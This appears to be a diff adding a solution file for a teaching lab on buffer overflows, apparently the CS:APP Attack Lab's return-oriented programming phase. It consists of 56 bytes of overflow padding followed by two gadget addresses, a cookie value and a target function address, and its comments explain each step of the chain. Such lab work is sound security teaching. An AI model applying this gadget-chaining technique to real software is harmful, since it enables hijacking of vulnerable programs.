@@ -1,0 +1,23 @@
+00 00 00 00 00 00 00 00 /* Begin buffer (56 bytes) */
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+/* End buffer */
+
+f2 1a 40 00 00 00 00 00 /* gadget1: popq %rax (the address + offset(0 to # location) (58 c3) */
+
+d0 8c 8e 64 00 00 00 00 /* value of cookie */
+
+fd 1a 40 00 00 00 00 00 /* gadget2: move %rax to %rdi (the address + offset(0 to # location) (48 89 c7 next to c3 and next c3) */
+
+26 19 40 00 00 00 00 00 /* address of touch2 */
